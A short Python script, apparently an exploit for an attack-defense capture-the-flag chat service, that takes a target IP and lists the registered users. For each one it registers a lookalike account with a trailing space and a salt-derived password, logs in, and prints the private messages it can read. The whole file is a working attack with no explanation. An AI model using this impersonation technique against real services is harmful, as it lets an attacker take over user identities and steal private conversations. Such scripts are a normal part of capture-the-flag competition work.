#!/usr/bin/env python3

import sys
import requests
from hashlib import sha512
from checklib import *
from chat_lib import *

ip = sys.argv[1]

mch = CheckMachine(ip)

u, p = mch.register_user()
s = mch.login_user(u, p)
mch.enter_chat(s)

l = mch.list_users(s)

for u1 in l:
    try:
        fake_u = u1.get("name") + " "
        p = sha512(b"SALT_!@3123" + fake_u.encode()).hexdigest()
        r = requests.post(f'http://{ip}:8000/api/auth/register', json={
            "name": fake_u,
            "password": p,
        })
        s = mch.login_user(fake_u, p)
        for u2 in l:
            try:
                m = mch.get_messages(s, u2.get("name"))
                print(m, flush=True)
            except:
                pass
    except:
        pass